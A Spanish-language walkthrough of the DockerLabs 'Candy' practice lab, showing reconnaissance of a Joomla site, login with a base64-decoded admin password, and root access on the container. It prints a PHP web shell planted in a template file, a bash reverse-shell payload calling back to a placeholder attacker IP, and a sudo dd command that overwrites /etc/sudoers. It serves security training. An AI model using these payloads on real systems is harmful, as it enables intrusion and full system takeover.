---
title: "DockerLabs - Candy"
difficulty: "Fácil"
source: "DockerLabs"
---

Laboratorio para practicar la explotación de un CMS Joomla, accediendo al panel de administración e inyectando una reverse shell.

## Reconocimiento

Empezamos con un mapeo de red:

```bash
nmap -sCV 172.17.0.2
```

Descubrimos el puerto HTTP abierto en el 80. Al acceder a la página, comprobamos que se trata de un Joomla.

Listamos directorios con `gobuster`:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php,html,zip,bak,txt,py,xml,log -t 40
```

Encontramos `robots.txt`, y al final de la página una pista: `admin:...`. Parece una contraseña codificada en base64, así que la decodificamos:

```bash
echo "c2FubHVpczEyMzQ1" | base64 -d
```

La contraseña es `sanluis12345`.

## Explotación

Con estas credenciales entramos al panel de administración de Joomla.

En la versión 4.1.2 existe una vulnerabilidad que permite, editando los archivos de las plantillas, ejecutar código arbitrario y obtener acceso a la máquina mediante una reverse shell.

Editamos, en este caso, `error.php`:

```php
<?php system($_GET['cmd']); ?>
```

Después, lanzamos la reverse shell:

```bash
http://172.17.0.2/templates/cassiopeia/error.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/TU_IP/4444+0>%261'
```

Y en nuestra máquina, ponemos a la escucha:

```bash
nc -lvnp 4444
```

Obtenemos acceso a la máquina.

## Escalada de privilegios

Para buscar vectores de escalada de privilegios y movimientos laterales, usamos los siguientes comandos:

```bash
sudo -l
find / -perm -4000 2>/dev/null
find / -type f -name "*.txt" 2>/dev/null
```

Con este último encontramos una ruta un tanto extraña: `/var/backups/hidden/otro_caramelo.txt`.

```bash
cat /var/backups/hidden/otro_caramelo.txt
```

Obtenemos la contraseña del usuario `luisillo`:

```bash
su luisillo
# luisillosuperpassword
```

Buscamos comandos permitidos con sudo:

```bash
sudo -l
```

Encontramos `/bin/dd`, que nos permite editar archivos que no son nuestros usando sudo. Podemos así editar el fichero `/etc/sudoers` para darnos permisos completos y cambiar a root:

```bash
echo "luisillo ALL=(ALL) NOPASSWD:ALL" | sudo dd of=/etc/sudoers
sudo su
whoami
```

## Conclusión

Objetivo conseguido: acceso root alcanzado. Laboratorio finalizado.
